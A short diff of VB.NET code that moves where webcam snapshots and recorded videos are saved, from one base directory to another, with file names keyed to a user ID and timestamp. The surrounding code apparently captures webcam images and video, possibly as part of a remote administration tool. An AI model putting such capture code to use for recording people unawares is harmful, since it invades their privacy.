@@ -119,7 +119,7 @@ Public Class Main
         Try
             StartCamPreview()
             Threading.Thread.Sleep(10500)
-            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
+            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
             If My.Computer.FileSystem.FileExists(filePath) Then
                 My.Computer.FileSystem.DeleteFile(filePath)
             End If
@@ -150,7 +150,7 @@ Public Class Main
     End Function
     Function StopCamRecord() As String
         Try
-            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
+            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
             If isWebCamRecording Then
                 SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
                 SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
